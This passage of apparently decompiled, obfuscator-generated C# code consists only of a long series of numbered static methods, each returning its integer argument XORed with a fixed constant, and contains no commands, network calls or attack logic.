	{
		return int_4 ^ 0xBC133EC;
	}

	[Obsolete("Exclude")]
	public static int smethod_3089(int int_4)
	{
		return int_4 ^ 0x7A2340C5;
	}

	[Obsolete("Exclude")]
	public static int smethod_3090(int int_4)
	{
		return int_4 ^ 0xEA59845;
	}

	[Obsolete("Exclude")]
	public static int smethod_3091(int int_4)
	{
		return int_4 ^ 0x5EA57985;
	}

	[Obsolete("Exclude")]
	public static int smethod_3092(int int_4)
	{
		return int_4 ^ 0x400AAF73;
	}

	[Obsolete("Exclude")]
	public static int smethod_3093(int int_4)
	{
		return int_4 ^ 0x3ABC167D;
	}

	[Obsolete("Exclude")]
	public static int smethod_3094(int int_4)
	{
		return int_4 ^ 0x6B2D72F8;
	}

	[Obsolete("Exclude")]
	public static int smethod_3095(int int_4)
	{
		return int_4 ^ 0x7B8981F4;
	}

	[Obsolete("Exclude")]
	public static int smethod_3096(int int_4)
	{
		return int_4 ^ 0xB71637F;
	}

	[Obsolete("Exclude")]
	public static int smethod_3097(int int_4)
	{
		return int_4 ^ 0x243EE9E8;
	}

	[Obsolete("Exclude")]
	public static int smethod_3098(int int_4)
	{
		return int_4 ^ 0x39561981;
	}

	[Obsolete("Exclude")]
	public static int smethod_3099(int int_4)
	{
		return int_4 ^ 0x57CD0B0D;
	}

	[Obsolete("Exclude")]
	public static int smethod_3100(int int_4)
	{
		return int_4 ^ 0x47EA8DE5;
	}

	[Obsolete("Exclude")]
	public static int smethod_3101(int int_4)
	{
		return int_4 ^ 0x2BD744A0;
	}

	[Obsolete("Exclude")]
	public static int smethod_3102(int int_4)
	{
		return int_4 ^ 0x59D1CE7B;
	}

	[Obsolete("Exclude")]
	public static int smethod_3103(int int_4)
	{
		return int_4 ^ 0x739CF9F0;
	}

	[Obsolete("Exclude")]
	public static int smethod_3104(int int_4)
	{
		return int_4 ^ 0x19B582EE;
	}

	[Obsolete("Exclude")]
	public static int smethod_3105(int int_4)
	{
		return int_4 ^ 0x67317391;
	}

	[Obsolete("Exclude")]
	public static int smethod_3106(int int_4)
	{
		return int_4 ^ 0x2ACD5100;
	}

	[Obsolete("Exclude")]
	public static int smethod_3107(int int_4)
	{
		return int_4 ^ 0x6DF2C6;
	}

	[Obsolete("Exclude")]
	public static int smethod_3108(int int_4)
	{
		return int_4 ^ 0x2AD0B7B1;
	}

	[Obsolete("Exclude")]
	public static int smethod_3109(int int_4)
	{
		return int_4 ^ 0x5EEE4B4;
	}

	[Obsolete("Exclude")]
	public static int smethod_3110(int int_4)
	{
		return int_4 ^ 0x400E8CC3;
	}

	[Obsolete("Exclude")]
	public static int smethod_3111(int int_4)
	{
		return int_4 ^ 0x44423139;
	}

	[Obsolete("Exclude")]
	public static int smethod_3112(int int_4)
	{
		return int_4 ^ 0x29CCA44;
	}

	[Obsolete("Exclude")]
	public static int smethod_3113(int int_4)
	{
		return int_4 ^ 0x6637FCE1;
	}

	[Obsolete("Exclude")]
	public static int smethod_3114(int int_4)
	{
		return int_4 ^ 0x7BE67674;
	}

	[Obsolete("Exclude")]
	public static int smethod_3115(int int_4)
	{
		return int_4 ^ 0x6A95BAD3;
	}

	[Obsolete("Exclude")]
	public static int smethod_3116(int int_4)
	{
		return int_4 ^ 0x77CAF3D9;
	}

	[Obsolete("Exclude")]
	public static int smethod_3117(int int_4)
	{
		return int_4 ^ 0x3A3F2C7C;
	}

	[Obsolete("Exclude")]
	public static int smethod_3118(int int_4)
	{
		return int_4 ^ 0x1DEA5322;
	}

	[Obsolete("Exclude")]
	public static int smethod_3119(int int_4)
	{
		return int_4 ^ 0x5F53BDB4;
	}

	[Obsolete("Exclude")]
	public static int smethod_3120(int int_4)
	{
		return int_4 ^ 0x74FDB181;
	}

	[Obsolete("Exclude")]
	public static int smethod_3121(int int_4)
	{
		return int_4 ^ 0x387D3A57;
	}

	[Obsolete("Exclude")]
	public static int smethod_3122(int int_4)
	{
		return int_4 ^ 0x19332AF9;
	}

	[Obsolete("Exclude")]
	public static int smethod_3123(int int_4)
	{
		return int_4 ^ 0x3076717F;
	}

	[Obsolete("Exclude")]
	public static int smethod_3124(int int_4)
	{
		return int_4 ^ 0x20B4BE3F;
	}

	[Obsolete("Exclude")]
	public static int smethod_3125(int int_4)
	{
		return int_4 ^ 0x513D7A92;
	}

	[Obsolete("Exclude")]
	public static int smethod_3126(int int_4)
	{
		return int_4 ^ 0x581E8926;
	}

	[Obsolete("Exclude")]
	public static int smethod_3127(int int_4)
	{
		return int_4 ^ 0x1FFCC66F;
	}

	[Obsolete("Exclude")]
	public static int smethod_3128(int int_4)
	{
		return int_4 ^ 0x75718306;
	}

	[Obsolete("Exclude")]
	public static int smethod_3129(int int_4)
	{
		return int_4 ^ 0x1B36E209;
	}

	[Obsolete("Exclude")]
	public static int smethod_3130(int int_4)
	{
		return int_4 ^ 0x5ABEEF8F;
	}

	[Obsolete("Exclude")]
	public static int smethod_3131(int int_4)
	{
		return int_4 ^ 0x7BB79D3B;
	}

	[Obsolete("Exclude")]
	public static int smethod_3132(int int_4)
	{
		return int_4 ^ 0xF99BA8;
	}

	[Obsolete("Exclude")]
	public static int smethod_3133(int int_4)
	{
		return int_4 ^ 0x29E1EF5C;
	}

	[Obsolete("Exclude")]
	public static int smethod_3134(int int_4)
	{
		return int_4 ^ 0x5FD27939;
	}

	[Obsolete("Exclude")]
	public static int smethod_3135(int int_4)
	{
		return int_4 ^ 0x2E7C5E70;
	}

	[Obsolete("Exclude")]
	public static int smethod_3136(int int_4)
	{
		return int_4 ^ 0x3ECFA524;
	}

	[Obsolete("Exclude")]
	public static int smethod_3137(int int_4)
	{
		return int_4 ^ 0x6E4CB8BF;
	}

	[Obsolete("Exclude")]
	public static int smethod_3138(int int_4)
	{
		return int_4 ^ 0x87D1373;
	}

	[Obsolete("Exclude")]
	public static int smethod_3139(int int_4)
	{
		return int_4 ^ 0x496A8FF1;
	}

	[Obsolete("Exclude")]
	public static int smethod_3140(int int_4)
	{
		return int_4 ^ 0x4B5611EB;
	}

	[Obsolete("Exclude")]
	public static int smethod_3141(int int_4)
	{
		return int_4 ^ 0x5660BFA1;
	}

	[Obsolete("Exclude")]
	public static int smethod_3142(int int_4)
	{
		return int_4 ^ 0x1D981E6E;
	}

	[Obsolete("Exclude")]
	public static int smethod_3143(int int_4)
	{
		return int_4 ^ 0x4CEBA98B;
	}

	[Obsolete("Exclude")]
	public static int smethod_3144(int int_4)
	{
		return int_4 ^ 0x15AACF10;
	}

	[Obsolete("Exclude")]
	public static int smethod_3145(int int_4)
	{
		return int_4 ^ 0x2757C2F5;
	}

	[Obsolete("Exclude")]
	public static int smethod_3146(int int_4)
	{
		return int_4 ^ 0x73753AD9;
	}

	[Obsolete("Exclude")]
	public static int smethod_3147(int int_4)
	{
		return int_4 ^ 0x5BCB47F2;
	}

	[Obsolete("Exclude")]
	public static int smethod_3148(int int_4)
	{
		return int_4 ^ 0x3182A7A;
	}

	[Obsolete("Exclude")]
	public static int smethod_3149(int int_4)
	{
		return int_4 ^ 0x5DE49D39;
	}

	[Obsolete("Exclude")]
	public static int smethod_3150(int int_4)
	{
		return int_4 ^ 0x637A5614;
	}

	[Obsolete("Exclude")]
	public static int smethod_3151(int int_4)
	{
		return int_4 ^ 0x25423A4A;
	}

	[Obsolete("Exclude")]
	public static int smethod_3152(int int_4)
	{
		return int_4 ^ 0x685F6C48;
	}

	[Obsolete("Exclude")]
	public static int smethod_3153(int int_4)
	{
		return int_4 ^ 0x4FC191C4;
	}

	[Obsolete("Exclude")]
	public static int smethod_3154(int int_4)
	{
		return int_4 ^ 0x6637CB9;
	}

	[Obsolete("Exclude")]
	public static int smethod_3155(int int_4)
	{
		return int_4 ^ 0x5EAD6CEF;
	}

	[Obsolete("Exclude")]
	public static int smethod_3156(int int_4)
	{
		return int_4 ^ 0x44A18D98;
	}

	[Obsolete("Exclude")]
	public static int smethod_3157(int int_4)
	{
		return int_4 ^ 0x24D85632;
	}

	[Obsolete("Exclude")]
	public static int smethod_3158(int int_4)
	{
		return int_4 ^ 0x51D1C01B;
	}

	[Obsolete("Exclude")]
	public static int smethod_3159(int int_4)
	{
		return int_4 ^ 0x715ED09E;
	}

	[Obsolete("Exclude")]
	public static int smethod_3160(int int_4)
	{
		return int_4 ^ 0x7229201;
	}

	[Obsolete("Exclude")]
	public static int smethod_3161(int int_4)
	{
		return int_4 ^ 0x64AC0D0A;
	}

	[Obsolete("Exclude")]
	public static int smethod_3162(int int_4)
	{
		return int_4 ^ 0x15F9BB8B;
	}

	[Obsolete("Exclude")]
	public static int smethod_3163(int int_4)
	{
		return int_4 ^ 0x39518C8C;
	}

	[Obsolete("Exclude")]
	public static int smethod_3164(int int_4)
	{
		return int_4 ^ 0x438CE80A;
	}

	[Obsolete("Exclude")]
	public static int smethod_3165(int int_4)
	{
		return int_4 ^ 0x3F84C62A;
	}

	[Obsolete("Exclude")]
	public static int smethod_3166(int int_4)
	{
		return int_4 ^ 0x409783D6;
	}

	[Obsolete("Exclude")]
	public static int smethod_3167(int int_4)
	{
		return int_4 ^ 0x5A97B1EB;
	}

	[Obsolete("Exclude")]
	public static int smethod_3168(int int_4)
	{
		return int_4 ^ 0x22BE6165;
	}

	[Obsolete("Exclude")]
	public static int smethod_3169(int int_4)
	{
		return int_4 ^ 0x49347E4;
	}

	[Obsolete("Exclude")]
	public static int smethod_3170(int int_4)
	{
		return int_4 ^ 0x7992979F;
	}

	[Obsolete("Exclude")]
	public static int smethod_3171(int int_4)
	{
		return int_4 ^ 0x367A0E90;
	}

	[Obsolete("Exclude")]
	public static int smethod_3172(int int_4)
	{
		return int_4 ^ 0x4DBB6DB7;
	}

	[Obsolete("Exclude")]
	public static int smethod_3173(int int_4)
	{
		return int_4 ^ 0x2215CF95;
	}

	[Obsolete("Exclude")]
	public static int smethod_3174(int int_4)
	{
		return int_4 ^ 0x2C56AA18;
	}

	[Obsolete("Exclude")]
	public static int smethod_3175(int int_4)
	{
		return int_4 ^ 0x3C84E66F;
	}

	[Obsolete("Exclude")]
	public static int smethod_3176(int int_4)
	{
		return int_4 ^ 0x5ABDD5B6;
	}

	[Obsolete("Exclude")]
	public static int smethod_3177(int int_4)
	{
		return int_4 ^ 0xFE864A5;
	}

	[Obsolete("Exclude")]
	public static int smethod_3178(int int_4)
	{
		return int_4 ^ 0x6EA65501;
	}

	[Obsolete("Exclude")]
	public static int smethod_3179(int int_4)
	{
		return int_4 ^ 0x37A914A6;
	}

	[Obsolete("Exclude")]
	public static int smethod_3180(int int_4)
	{
		return int_4 ^ 0x75519F24;
	}

	[Obsolete("Exclude")]
	public static int smethod_3181(int int_4)
	{
		return int_4 ^ 0x588D55A3;
	}

	[Obsolete("Exclude")]
	public static int smethod_3182(int int_4)
	{
		return int_4 ^ 0x5C5550A2;
	}

	[Obsolete("Exclude")]
	public static int smethod_3183(int int_4)
	{
		return int_4 ^ 0x1C829C59;
	}

	[Obsolete("Exclude")]
	public static int smethod_3184(int int_4)
	{
		return int_4 ^ 0x2DF2CAE1;
	}

	[Obsolete("Exclude")]
	public static int smethod_3185(int int_4)
	{
		return int_4 ^ 0x1CA6D36;
	}

	[Obsolete("Exclude")]
	public static int smethod_3186(int int_4)
	{
		return int_4 ^ 0x16169C63;
	}

	[Obsolete("Exclude")]
	public static int smethod_3187(int int_4)
	{
		return int_4 ^ 0x72170D6A;
	}

	[Obsolete("Exclude")]
	public static int smethod_3188(int int_4)
	{
		return int_4 ^ 0x257449AA;
	}

	[Obsolete("Exclude")]
	public static int smethod_3189(int int_4)
	{
		return int_4 ^ 0x440B46BD;
	}

	[Obsolete("Exclude")]
	public static int smethod_3190(int int_4)
	{
		return int_4 ^ 0x24C1A7F;
	}

	[Obsolete("Exclude")]
	public static int smethod_3191(int int_4)
	{
		return int_4 ^ 0xCAFE22;
	}

	[Obsolete("Exclude")]
	public static int smethod_3192(int int_4)
	{
		return int_4 ^ 0x3CD74CA0;
	}

	[Obsolete("Exclude")]
	public static int smethod_3193(int int_4)
	{
		return int_4 ^ 0x3DBB00C0;
	}

	[Obsolete("Exclude")]
	public static int smethod_3194(int int_4)
	{
		return int_4 ^ 0x5630F737;
	}

	[Obsolete("Exclude")]
	public static int smethod_3195(int int_4)
	{
		return int_4 ^ 0x4E745738;
	}

	[Obsolete("Exclude")]
	public static int smethod_3196(int int_4)
	{
		return int_4 ^ 0x48CA2DA6;
	}

	[Obsolete("Exclude")]
	public static int smethod_3197(int int_4)
	{
		return int_4 ^ 0x3E9F859E;
	}

	[Obsolete("Exclude")]
	public static int smethod_3198(int int_4)
	{
		return int_4 ^ 0x6C2C3938;
	}

	[Obsolete("Exclude")]
	public static int smethod_3199(int int_4)
	{
		return int_4 ^ 0x532A40C6;
	}

	[Obsolete("Exclude")]
	public static int smethod_3200(int int_4)
	{
		return int_4 ^ 0x2AAD9FDC;
	}

	[Obsolete("Exclude")]
	public static int smethod_3201(int int_4)
	{
		return int_4 ^ 0x6A05AECA;
	}

	[Obsolete("Exclude")]
	public static int smethod_3202(int int_4)
	{
		return int_4 ^ 0x6B545C96;
	}

	[Obsolete("Exclude")]
	public static int smethod_3203(int int_4)
	{
		return int_4 ^ 0x3E09547D;
	}

	[Obsolete("Exclude")]
	public static int smethod_3204(int int_4)
	{
		return int_4 ^ 0x673EBAB5;
	}

	[Obsolete("Exclude")]
	public static int smethod_3205(int int_4)
	{
		return int_4 ^ 0xCD040DD;
	}

	[Obsolete("Exclude")]
	public static int smethod_3206(int int_4)
	{
		return int_4 ^ 0x3394FAB6;
	}

	[Obsolete("Exclude")]
	public static int smethod_3207(int int_4)
	{
		return int_4 ^ 0x6E124B48;
	}

	[Obsolete("Exclude")]
	public static int smethod_3208(int int_4)
	{
		return int_4 ^ 0x7996B727;
	}

	[Obsolete("Exclude")]
	public static int smethod_3209(int int_4)
	{
		return int_4 ^ 0x732496A5;
	}

	[Obsolete("Exclude")]
	public static int smethod_3210(int int_4)
	{
		return int_4 ^ 0x2DEE333;
	}

	[Obsolete("Exclude")]
	public static int smethod_3211(int int_4)
	{
		return int_4 ^ 0x18748413;
	}

	[Obsolete("Exclude")]
	public static int smethod_3212(int int_4)
	{
		return int_4 ^ 0x3BC4DBB4;
	}

	[Obsolete("Exclude")]
	public static int smethod_3213(int int_4)
	{
		return int_4 ^ 0x1E385ED4;
	}

	[Obsolete("Exclude")]
	public static int smethod_3214(int int_4)
	{
		return int_4 ^ 0x3A005B6F;
	}

	[Obsolete("Exclude")]
	public static int smethod_3215(int int_4)
	{
		return int_4 ^ 0x765676A0;
	}

	[Obsolete("Exclude")]
	public static int smethod_3216(int int_4)
	{
		return int_4 ^ 0x61AFF07D;
	}

	[Obsolete("Exclude")]
	public static int smethod_3217(int int_4)
	{
		return int_4 ^ 0x165AE3FE;
	}

	[Obsolete("Exclude")]
	public static int smethod_3218(int int_4)
	{
		return int_4 ^ 0x67C998EE;
	}

	[Obsolete("Exclude")]
	public static int smethod_3219(int int_4)
	{
		return int_4 ^ 0x507E037D;
	}

	[Obsolete("Exclude")]
	public static int smethod_3220(int int_4)
	{
		return int_4 ^ 0xC2BFBC2;
	}

	[Obsolete("Exclude")]
	public static int smethod_3221(int int_4)
	{
		return int_4 ^ 0x139D6FF4;
	}

	[Obsolete("Exclude")]
	public static int smethod_3222(int int_4)
	{
		return int_4 ^ 0xE6981F;
	}

	[Obsolete("Exclude")]
	public static int smethod_3223(int int_4)
	{
		return int_4 ^ 0x46755690;
	}

	[Obsolete("Exclude")]
	public static int smethod_3224(int int_4)
	{
		return int_4 ^ 0x1369F6F9;
	}

	[Obsolete("Exclude")]
	public static int smethod_3225(int int_4)
	{
		return int_4 ^ 0x32B9ACF5;
	}

	[Obsolete("Exclude")]
	public static int smethod_3226(int int_4)
	{
		return int_4 ^ 0xB6FD19C;
	}

	[Obsolete("Exclude")]
	public static int smethod_3227(int int_4)
	{
		return int_4 ^ 0x765812FB;
	}

	[Obsolete("Exclude")]
	public static int smethod_3228(int int_4)
	{
		return int_4 ^ 0xDCD9754;
	}

	[Obsolete("Exclude")]
	public static int smethod_3229(int int_4)
	{
		return int_4 ^ 0x21ED42B;
	}

	[Obsolete("Exclude")]
	public static int smethod_3230(int int_4)
	{
		return int_4 ^ 0x6F5DFC9A;
	}

	[Obsolete("Exclude")]
	public static int smethod_3231(int int_4)
	{
		return int_4 ^ 0x973AA94;
	}

	[Obsolete("Exclude")]
	public static int smethod_3233(int int_4)
	{
		return int_4 ^ 0x6A3130B2;
	}

	[Obsolete("Exclude")]
	public static int smethod_3234(int int_4)
	{
		return int_4 ^ 0x6DC4E56D;
	}

	[Obsolete("Exclude")]
	public static int smethod_3235(int int_4)
	{
		return int_4 ^ 0x150F6EAD;
	}

	[Obsolete("Exclude")]
	public static int smethod_3236(int int_4)
	{
		return int_4 ^ 0x4AB4EA35;
	}

	[Obsolete("Exclude")]
	public static int smethod_3237(int int_4)
	{
		return int_4 ^ 0x5921975F;
	}

	[Obsolete("Exclude")]
	public static int smethod_3238(int int_4)
	{
		return int_4 ^ 0x7C4E86E;
	}

	[Obsolete("Exclude")]
	public static int smethod_3239(int int_4)
	{
		return int_4 ^ 0x666F337B;
	}

	[Obsolete("Exclude")]
	public static int smethod_3240(int int_4)
	{
		return int_4 ^ 0x58E59880;
	}

	[Obsolete("Exclude")]
	public static int smethod_3241(int int_4)
	{
		return int_4 ^ 0x73630CFC;
	}

	[Obsolete("Exclude")]
	public static int smethod_3242(int int_4)
	{
		return int_4 ^ 0x47F2A9CF;
	}

	[Obsolete("Exclude")]
	public static int smethod_3243(int int_4)
	{
		return int_4 ^ 0x2495052D;
	}

	[Obsolete("Exclude")]
	public static int smethod_3244(int int_4)
	{
		return int_4 ^ 0x3B51152E;
	}

	[Obsolete("Exclude")]
	public static int smethod_3245(int int_4)
	{
		return int_4 ^ 0x312E5918;
	}

	[Obsolete("Exclude")]
	public static int smethod_3246(int int_4)
	{
		return int_4 ^ 0x32A30CD9;
	}

	[Obsolete("Exclude")]
	public static int smethod_3247(int int_4)
	{
		return int_4 ^ 0x2710DCC2;
	}

	[Obsolete("Exclude")]
	public static int smethod_3248(int int_4)
	{
		return int_4 ^ 0x4106963;
	}

	[Obsolete("Exclude")]
	public static int smethod_3249(int int_4)
	{
		return int_4 ^ 0x219EB82A;
	}

	[Obsolete("Exclude")]
	public static int smethod_3250(int int_4)
	{
		return int_4 ^ 0x370FCDE7;
	}

	[Obsolete("Exclude")]
	public static int smethod_3251(int int_4)
	{
		return int_4 ^ 0x4367FFB7;
	}

	[Obsolete("Exclude")]
	public static int smethod_3252(int int_4)
	{
		return int_4 ^ 0x18D86EE2;
	}

	[Obsolete("Exclude")]
	public static int smethod_3253(int int_4)
	{
		return int_4 ^ 0x3F8ACD69;
	}

	[Obsolete("Exclude")]
	public static int smethod_3254(int int_4)
	{
		return int_4 ^ 0x1BC13F54;
	}

	[Obsolete("Exclude")]
	public static int smethod_3255(int int_4)
	{
		return int_4 ^ 0x30F306E4;
	}

	[Obsolete("Exclude")]
	public static int smethod_3256(int int_4)
	{
		return int_4 ^ 0x69616F6E;
	}

	[Obsolete("Exclude")]
	public static int smethod_3257(int int_4)
	{
		return int_4 ^ 0x3D7E1672;
	}

	[Obsolete("Exclude")]
	public static int smethod_3258(int int_4)
	{
		return int_4 ^ 0x771D93C4;
	}

	[Obsolete("Exclude")]
	public static int smethod_3259(int int_4)
	{
		return int_4 ^ 0x7B2C641D;
	}

	[Obsolete("Exclude")]
	public static int smethod_3260(int int_4)
	{
		return int_4 ^ 0x26EF2881;
	}

	[Obsolete("Exclude")]
	public static int smethod_3261(int int_4)
	{
		return int_4 ^ 0x2ED919EC;
	}

	[Obsolete("Exclude")]
	public static int smethod_3262(int int_4)
	{
		return int_4 ^ 0x643F730C;
	}

	[Obsolete("Exclude")]
	public static int smethod_3263(int int_4)
	{
		return int_4 ^ 0x2E5F9EEC;
	}

	[Obsolete("Exclude")]
	public static int smethod_3264(int int_4)
	{
		return int_4 ^ 0x3B82953D;
	}

	[Obsolete("Exclude")]
	public static int smethod_3265(int int_4)
	{
		return int_4 ^ 0x24BD190C;
	}

	[Obsolete("Exclude")]
	public static int smethod_3266(int int_4)
	{
		return int_4 ^ 0x241ED655;
	}

	[Obsolete("Exclude")]
	public static int smethod_3267(int int_4)
	{
		return int_4 ^ 0x8DEBCF;
	}

	[Obsolete("Exclude")]
	public static int smethod_3268(int int_4)
	{
		return int_4 ^ 0x217803B;
	}

	[Obsolete("Exclude")]
	public static int smethod_3269(int int_4)
	{
		return int_4 ^ 0x654AF9B0;
	}

	[Obsolete("Exclude")]
	public static int smethod_3270(int int_4)
	{
		return int_4 ^ 0x2239A740;
	}

	[Obsolete("Exclude")]
	public static int smethod_3271(int int_4)
	{
		return int_4 ^ 0x46FF036E;
	}

	[Obsolete("Exclude")]
	public static int smethod_3272(int int_4)
	{
		return int_4 ^ 0x29C08991;
	}

	[Obsolete("Exclude")]
	public static int smethod_3273(int int_4)
	{
		return int_4 ^ 0x2FB172EA;
	}

	[Obsolete("Exclude")]
	public static int smethod_3274(int int_4)
	{
		return int_4 ^ 0x79BC3596;
	}

	[Obsolete("Exclude")]
	public static int smethod_3275(int int_4)
	{
		return int_4 ^ 0x77D95E01;
	}

	[Obsolete("Exclude")]
	public static int smethod_3276(int int_4)
	{
		return int_4 ^ 0x37CB68AB;
	}

	[Obsolete("Exclude")]
	public static int smethod_3277(int int_4)
	{
		return int_4 ^ 0x744D1FF7;
	}

	[Obsolete("Exclude")]
	public static int smethod_3278(int int_4)
	{
		return int_4 ^ 0xA2C82D8;
	}

	[Obsolete("Exclude")]
	public static int smethod_3279(int int_4)
	{
		return int_4 ^ 0x61CBE732;
	}

	[Obsolete("Exclude")]
	public static int smethod_3280(int int_4)
	{
		return int_4 ^ 0x58E20767;
	}

	[Obsolete("Exclude")]
	public static int smethod_3281(int int_4)
	{
		return int_4 ^ 0x27C73610;
	}

	[Obsolete("Exclude")]
	public static int smethod_3282(int int_4)
	{
		return int_4 ^ 0x1FD35B5C;
	}

	[Obsolete("Exclude")]
	public static int smethod_3283(int int_4)
	{
		return int_4 ^ 0x62B49EB0;
	}

	[Obsolete("Exclude")]
	public static int smethod_3284(int int_4)
	{
		return int_4 ^ 0x2D5E847E;
	}

	[Obsolete("Exclude")]
	public static int smethod_3285(int int_4)
	{
		return int_4 ^ 0x6695D4A2;
	}

	[Obsolete("Exclude")]
	public static int smethod_3286(int int_4)
	{
		return int_4 ^ 0x68AD70D6;
	}

	[Obsolete("Exclude")]
	public static int smethod_3287(int int_4)
	{
		return int_4 ^ 0x39E73AB1;
	}

	[Obsolete("Exclude")]
	public static int smethod_3288(int int_4)
	{
		return int_4 ^ 0x7EA814F5;
	}

	[Obsolete("Exclude")]
	public static int smethod_3289(int int_4)
	{
		return int_4 ^ 0x759BBDFB;
	}

	[Obsolete("Exclude")]
	public static int smethod_3290(int int_4)
	{
		return int_4 ^ 0x56F5C477;
	}

	[Obsolete("Exclude")]
	public static int smethod_3291(int int_4)
	{
		return int_4 ^ 0x12506885;
	}

	[Obsolete("Exclude")]
	public static int smethod_3292(int int_4)
	{
		return int_4 ^ 0x579E0FBD;
	}

	[Obsolete("Exclude")]
	public static int smethod_3293(int int_4)
	{
		return int_4 ^ 0x6CF86706;
	}

	[Obsolete("Exclude")]
	public static int smethod_3294(int int_4)
	{
		return int_4 ^ 0x2B6A7228;
	}

	[Obsolete("Exclude")]
	public static int smethod_3295(int int_4)
	{
		return int_4 ^ 0x3A3467F9;
	}

	[Obsolete("Exclude")]
	public static int smethod_3296(int int_4)
	{
		return int_4 ^ 0x2AE66403;
	}

	[Obsolete("Exclude")]
	public static int smethod_3297(int int_4)
	{
		return int_4 ^ 0x341FC7D7;
	}

	[Obsolete("Exclude")]
	public static int smethod_3298(int int_4)
	{
		return int_4 ^ 0x5C6A36B4;
	}

	[Obsolete("Exclude")]
	public static int smethod_3299(int int_4)
	{
		return int_4 ^ 0x562557C3;
	}

	[Obsolete("Exclude")]
	public static int smethod_3300(int int_4)
	{
		return int_4 ^ 0x5A7C8B61;
	}

	[Obsolete("Exclude")]
	public static int smethod_3301(int int_4)
	{
		return int_4 ^ 0x5840F74E;
	}

	[Obsolete("Exclude")]
	public static int smethod_3302(int int_4)
	{
		return int_4 ^ 0x56B8767F;
	}

	[Obsolete("Exclude")]
	public static int smethod_3303(int int_4)
	{
		return int_4 ^ 0x5E2084CA;
	}

	[Obsolete("Exclude")]
	public static int smethod_3304(int int_4)
	{
		return int_4 ^ 0x2F3DBA30;
	}

	[Obsolete("Exclude")]
	public static int smethod_3305(int int_4)
	{
		return int_4 ^ 0x5648E5C4;
	}

	[Obsolete("Exclude")]
	public static int smethod_3306(int int_4)
	{
		return int_4 ^ 0x64649193;
	}

	[Obsolete("Exclude")]
	public static int smethod_3307(int int_4)
	{
		return int_4 ^ 0x55B39878;
	}

	[Obsolete("Exclude")]
	public static int smethod_3308(int int_4)
	{
		return int_4 ^ 0x6AD92101;
	}

	[Obsolete("Exclude")]
	public static int smethod_3309(int int_4)
	{
		return int_4 ^ 0x75F4B19E;
	}

	[Obsolete("Exclude")]
	public static int smethod_3310(int int_4)
	{
		return int_4 ^ 0x4F77EF03;
	}

	[Obsolete("Exclude")]
	public static int smethod_3311(int int_4)
	{
		return int_4 ^ 0x147457E8;
	}

	[Obsolete("Exclude")]
	public static int smethod_3312(int int_4)
	{
		return int_4 ^ 0x5E21AD79;
	}

	[Obsolete("Exclude")]
	public static int smethod_3313(int int_4)
	{
		return int_4 ^ 0x5A775859;
	}

	[Obsolete("Exclude")]
	public static int smethod_3314(int int_4)
	{
		return int_4 ^ 0x38C9AE1B;
	}

	[Obsolete("Exclude")]
	public static int smethod_3315(int int_4)
	{
		return int_4 ^ 0x1C70D4FC;
	}

	[Obsolete("Exclude")]
	public static int smethod_3316(int int_4)
	{
		return int_4 ^ 0x1B482BC6;
	}

	[Obsolete("Exclude")]
	public static int smethod_3317(int int_4)
	{
		return int_4 ^ 0x591D45C6;
	}

	[Obsolete("Exclude")]
	public static int smethod_3318(int int_4)
	{
		return int_4 ^ 0x4C552979;
	}

	[Obsolete("Exclude")]
	public static int smethod_3319(int int_4)
	{
		return int_4 ^ 0x51CF7A5D;
	}

	[Obsolete("Exclude")]
	public static int smethod_3320(int int_4)
	{
		return int_4 ^ 0x10E2227;
	}

	[Obsolete("Exclude")]
	public static int smethod_3321(int int_4)
	{
		return int_4 ^ 0x7764AD5B;
	}

	[Obsolete("Exclude")]
	public static int smethod_3322(int int_4)
	{
		return int_4 ^ 0x6A2AA207;
	}

	[Obsolete("Exclude")]
	public static int smethod_3323(int int_4)
	{
		return int_4 ^ 0x1F9C8EB4;
	}

	[Obsolete("Exclude")]
	public static int smethod_3324(int int_4)
	{
		return int_4 ^ 0x584F673F;
	}

	[Obsolete("Exclude")]
	public static int smethod_3325(int int_4)
	{
		return int_4 ^ 0x3D064E97;
	}

	[Obsolete("Exclude")]
	public static int smethod_3326(int int_4)
	{
		return int_4 ^ 0x5F528DA6;
	}

	[Obsolete("Exclude")]
	public static int smethod_3327(int int_4)
	{
		return int_4 ^ 0x5BCFEEF8;
	}

	[Obsolete("Exclude")]
	public static int smethod_3328(int int_4)
	{
		return int_4 ^ 0x56234EB3;
	}

	[Obsolete("Exclude")]
	public static int smethod_3329(int int_4)
	{
		return int_4 ^ 0x644BBE87;
	}

	[Obsolete("Exclude")]
	public static int smethod_3330(int int_4)
	{
		return int_4 ^ 0x568FF0DB;
	}

	[Obsolete("Exclude")]
	public static int smethod_3331(int int_4)
	{
		return int_4 ^ 0x47D300F4;
	}

	[Obsolete("Exclude")]
	public static int smethod_3332(int int_4)
	{
		return int_4 ^ 0x2A68B3BB;
	}

	[Obsolete("Exclude")]
	public static int smethod_3333(int int_4)
	{
		return int_4 ^ 0x1A0729FA;
	}

	[Obsolete("Exclude")]
	public static int smethod_3334(int int_4)
	{
		return int_4 ^ 0x6CF11AA9;
	}

	[Obsolete("Exclude")]
	public static int smethod_3335(int int_4)
	{
		return int_4 ^ 0x5F6AB5F5;
	}

	[Obsolete("Exclude")]
	public static int smethod_3336(int int_4)
	{
		return int_4 ^ 0x599C762F;
	}

	[Obsolete("Exclude")]
	public static int smethod_3337(int int_4)
	{
		return int_4 ^ 0xF9A145D;
	}

	[Obsolete("Exclude")]
	public static int smethod_3338(int int_4)
	{
		return int_4 ^ 0x7BBCC5E1;
	}

	[Obsolete("Exclude")]
	public static int smethod_3339(int int_4)
	{
		return int_4 ^ 0xC2B6E9C;
	}

	[Obsolete("Exclude")]
	public static int smethod_3340(int int_4)
	{
		return int_4 ^ 0x7696FE42;
	}

	[Obsolete("Exclude")]
	public static int smethod_3341(int int_4)
	{
		return int_4 ^ 0xCAE3B3C;
	}

	[Obsolete("Exclude")]
	public static int smethod_3342(int int_4)
	{
		return int_4 ^ 0x198AD6A8;
	}

	[Obsolete("Exclude")]
	public static int smethod_3343(int int_4)
	{
		return int_4 ^ 0x698C335A;
	}

	[Obsolete("Exclude")]
	public static int smethod_3344(int int_4)
	{
		return int_4 ^ 0x3D380FA;
	}

	[Obsolete("Exclude")]
	public static int smethod_3345(int int_4)
	{
		return int_4 ^ 0x6FFFAE61;
	}

	[Obsolete("Exclude")]
	public static int smethod_3346(int int_4)
	{
		return int_4 ^ 0xA5191D6;
	}

	[Obsolete("Exclude")]
	public static int smethod_3347(int int_4)
	{
		return int_4 ^ 0x347719B5;
	}

	[Obsolete("Exclude")]
	public static int smethod_3348(int int_4)
	{
		return int_4 ^ 0x5D361A00;
	}

	[Obsolete("Exclude")]
	public static int smethod_3349(int int_4)
	{
		return int_4 ^ 0x7B62A22D;
	}

